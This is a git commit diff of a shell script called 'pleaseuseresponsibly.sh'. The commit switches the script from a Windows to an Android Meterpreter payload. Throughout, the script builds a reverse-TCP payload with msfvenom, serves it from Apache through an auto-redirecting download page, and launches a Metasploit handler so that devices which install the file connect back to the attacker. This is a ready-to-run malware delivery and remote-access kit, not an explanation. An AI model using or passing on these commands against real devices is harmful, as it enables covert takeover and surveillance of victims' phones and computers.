0958e9195df9cc698220a4c4eac665e0d09f453b
810810810 <108226535+810810810@users.noreply.github.com>
2023-02-26 20:39:16 +0000

    Update pleaseuseresponsibly.sh

--- pleaseuseresponsibly.sh
+++ pleaseuseresponsibly.sh
@@ -4,7 +4,7 @@
 LOCAL_IP=$(hostname -I | awk '{print $1}')
 
 # Set the payload name
-PAYLOAD_NAME="payload_$(date +%s).exe"
+PAYLOAD_NAME="payload_$(date +%s).apk"
 
 # Set the Metasploit options
 LHOST=$LOCAL_IP
@@ -15,17 +15,16 @@ start_server() {
   echo "Web server started at http://$LOCAL_IP/"
   echo "To download the payload, visit http://$LOCAL_IP/downloads/$PAYLOAD_NAME"
 
+  # Create the payload download page
+  echo "<html><head><title>...</title><meta http-equiv=\"refresh\" content=\"0; url=/downloads/$PAYLOAD_NAME\"></head><body><p>Downloading payload...</p></body></html>" | sudo tee /var/www/html/downloads/index.html
+
   # Start Apache web server
   sudo systemctl start apache2
-
-  # Continuously print the access log to the terminal
-  echo "Visitors:"
-  sudo tail -f /var/log/apache2/access.log | awk '{print $1}'
 }
 
 # Generate the payload using msfvenom
 echo "Generating payload..."
-sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "/var/www/html/downloads/$PAYLOAD_NAME"
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "/var/www/html/downloads/$PAYLOAD_NAME"
 
 # Set the file permissions for the payload
 echo "Setting file permissions..."
@@ -33,7 +32,7 @@ sudo chmod 644 "/var/www/html/downloads/$PAYLOAD_NAME"
 
 # Start the Metasploit listener
 echo "Starting Metasploit listener..."
-gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
+gnome-terminal -- msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run"
 
 # Start the web server and print the access log to the terminal
 start_server
